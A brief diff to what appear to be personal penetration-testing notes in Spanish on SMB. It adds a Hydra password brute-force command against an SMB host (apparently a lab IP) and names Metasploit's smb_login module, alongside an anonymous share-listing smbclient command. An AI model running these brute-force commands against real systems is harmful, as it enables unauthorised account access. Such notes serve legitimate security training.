@@ -1,3 +1,8 @@
+smb hydra BF:
+hydra -L user.list -P password.list smb://10.129.42.197
+
+BF con metasploit:
+auxiliary/scanner/smb/smb_login
 
 Ver carpetas compartidas:
 smbclient -N -L \\\\ip
